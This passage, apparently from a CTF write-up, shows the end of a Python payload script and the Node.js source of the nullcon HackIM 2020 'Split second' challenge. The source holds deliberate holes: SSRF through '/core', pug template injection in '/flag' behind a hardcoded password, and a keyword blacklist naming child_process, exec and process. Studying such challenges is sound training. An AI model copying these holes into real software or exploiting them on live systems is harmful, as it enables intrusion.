style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nullcon-hackim2020split-second">[nullcon HackIM2020]Split second&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//node 8.12.0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/source.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/getMeme&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;iframe src=&amp;#34;https://giphy.com/embed/LLHkw7UnvY3Kw&amp;#34; width=&amp;#34;480&amp;#34; height=&amp;#34;480&amp;#34; frameBorder=&amp;#34;0&amp;#34; class=&amp;#34;giphy-embed&amp;#34; allowFullScreen&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&amp;#34;&amp;gt;via GIPHY&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;adminauth&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[a-z]/g&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;secretpassword&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;No characters&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;You need to come from localhost&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/getMeme?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;Errrrr, You have been Blocked&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#75af00">arrayLen&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">const&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">evilwords&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">server&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">listen&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8081&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
